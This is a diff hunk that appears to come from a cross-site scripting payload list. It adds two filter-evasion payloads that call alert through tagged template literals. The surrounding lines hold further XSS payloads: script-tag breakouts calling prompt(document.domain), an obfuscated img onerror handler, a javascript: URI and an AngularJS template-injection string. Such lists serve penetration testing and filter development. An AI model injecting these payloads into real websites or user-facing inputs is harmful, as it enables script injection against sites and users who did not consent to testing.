@@ -10,6 +10,8 @@ javascript:var{a:onerror}={a:%2561lert};throw%20origin
 %27";}</script><script>prompt(document.domain);</script>
 ‘>alert(154)</script><script/154=’;;;;;;;
 '>alert(154)</script><script/154=';;;;;;;
+''.replace.call`1${/.../}${alert}`
+".replace.call`1${/.../}${alert}`
 <img src="X" onerror=top[8680439..toString(30)](1337)>
 {{$on.constructor('alert(1)')()}}
 <script>top[8680439..toString(30)](1337)</script>
